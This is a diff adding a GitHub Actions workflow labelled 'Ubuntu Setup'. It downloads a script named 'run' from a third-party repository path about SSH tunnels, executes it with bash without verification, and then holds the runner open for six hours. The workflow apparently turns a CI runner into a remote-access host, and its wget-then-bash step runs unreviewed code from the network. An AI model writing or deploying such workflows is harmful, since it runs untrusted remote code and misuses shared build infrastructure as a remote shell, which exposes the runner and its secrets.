@@ -1,0 +1,22 @@
+name: Ubuntu Setup
+
+on:
+  workflow_dispatch:
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360   # 6 hours (360 minutes)
+    steps:
+      - uses: actions/checkout@v2
+
+      - name: Setup environment
+        run: |
+          cat /etc/os-release
+          sudo apt update -y
+          sudo apt install -y wget
+          wget https://github.com/githubaunglaymyanmar/sshinstall/raw/refs/heads/main/sshstunnel/run
+          bash run
+
+      - name: Keep runner alive
+        run: sleep 6h
